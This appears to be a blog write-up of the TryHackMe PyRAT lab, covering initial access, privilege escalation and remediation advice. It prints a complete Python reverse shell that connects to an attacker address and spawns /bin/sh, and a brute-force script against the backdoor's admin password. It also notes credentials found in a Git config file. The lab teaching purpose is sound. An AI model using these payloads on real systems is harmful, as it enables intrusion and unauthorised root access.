---
title: THM PyRAT - Exploitation and Remediation
categories:
  - offensive-security
tags:
classes: narrow
toc: true
toc_sticky: true
layout: single
read_time: true
---


# PyRAT — Exploitation and Remediation

  

This post walks through the exploitation of the TryHackMe's *PyRAT* machine, covering both initial access and privilege escalation, with a deliberate focus on remediation. Exploitation without remediation is incomplete—understanding how to fix a weakness is just as important as knowing how to abuse it. While it is not lost on me that this is an easy THM machine designed to be vulnerable, remediation should always be considered and is a great way to learn more.

  

Enumeration steps and alternative attack paths are intentionally omitted to keep the focus on exploitation mechanics and defensive takeaways.

  

---

  

## Initial Access

  

An initial `nmap` scan reveals ports **22 (SSH)** and **8000 (TCP)** exposed. Browsing to the HTTP service on port 8000 returns a message suggesting the use of a more basic connection method. Connecting with `netcat` confirms that the service accepts raw input over TCP.

  

```bash

nc <target-ip> 8000

```

  

The service drops the user into an interactive prompt that evaluates basic Python syntax. This effectively provides code execution within a constrained Python environment.

  

![[Pasted image 20260119172735.png]]

  

To transition from limited execution to a stable shell, a Python reverse shell payload was generated using **revshells.com** and executed within the service:

  

```python

import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(("192.168.xxx.xxx",4444))

os.dup2(s.fileno(),0)

os.dup2(s.fileno(),1)

os.dup2(s.fileno(),2)

import pty

pty.spawn("/bin/sh")

```

  

This payload establishes a reverse shell, providing interactive access to the system. This is a one-liner. I segmented it for readability.

  

---

  

## Privilege Escalation

  

Privilege escalation occurs in two distinct phases.

  

### Phase 1: Credential Exposure

  

During local enumeration, sensitive credentials are discovered in a Git configuration file located at:

  

```

/opt/dev/.git/config

```

  

The presence of credentials allow direct SSH access to the system as a legitimate user, think

  

[[Pasted image 20260119173237.png]]

  

---

  

### Phase 2: Root Access via PyRAT Backdoor

  

Further enumeration reveals a clue in the local mail file:

  

```

/var/mail/think

```

  

![[Pasted image 20260119173848.png]]

  

The contents reference a process containing the string *“rat”*. Reviewing running services confirms the presence of a suspicious background process. Researching the service leads to the discovery of **PyRAT**, a malicious backdoor.

  

![[Pasted image 20260119174020.png]]

  

The PyRAT service listens on port 8000 and exposes an undocumented `admin` command. When issued, the service prompts for a password. Because no rate limiting or authentication controls are in place, the password can be brute-forced.

  

A simple Python script was used to brute-force the administrative password:

  

```python

import socket

import sys

  

port = 8000

passfile = sys.argv[1]

  

with open(passfile) as f:

    for password in f:

        s = socket.socket()

        s.connect(('<target-ip>', port))

        s.send(b'admin')

        s.recv(1024)

        s.send(password.encode())

        response = s.recv(1024).decode()

        print(f"[-] Trying {password.strip()} ..")

        if "Welcome" in response:

            print(f"[+] Password found: {password.strip()}")

            break

        s.close()

```

  

![[Pasted image 20260119174832.png]]

![[Pasted image 20260119174858.png]]

  

Successful authentication grants root-level access to the system.

  

---

  

## Remediation

  

This machine highlights several common and high-impact security failures.

  

### Insecure Service Exposure

- Remove or restrict services that accept arbitrary input.

- Bind internal services to localhost.

- Implement authentication, validation, and monitoring.

  

### Credential Management Failures

- Never store secrets in version control.

- Use environment variables or secrets managers.

- Rotate exposed credentials immediately.

  

### Privileged Backdoors

- Audit running services and scheduled tasks.

- Enforce least privilege for all services.

- Rebuild compromised hosts.

  

### Network & Authentication Controls

- Forward logs to a SIEM.

- Restrict access via host-based firewalls.

  

While a silly, purposefully vulnerable machine, the lesson here for blue-team should be to analyze logs, implement a SIEM, and install applications that hunt for RootKits that could be installed on the system.
